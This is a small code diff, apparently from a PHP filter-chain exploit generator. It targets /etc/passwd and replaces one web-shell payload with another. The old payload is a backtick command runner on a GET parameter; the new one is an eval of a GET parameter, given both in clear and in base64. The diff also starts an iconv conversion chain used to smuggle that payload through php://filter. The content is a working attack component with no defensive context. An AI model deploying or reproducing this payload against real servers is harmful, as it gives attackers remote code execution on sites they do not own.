@@ -1,7 +1,7 @@
 file_to_use = "/etc/passwd"
 
-#<?=`$_GET[0]`;;?>
-base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"
+#<?php eval($_GET[1]);?>a
+base64_payload = "PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h"
 
 # generate some garbage base64
 filters = "convert.iconv.UTF8.CSISO2022KR|"
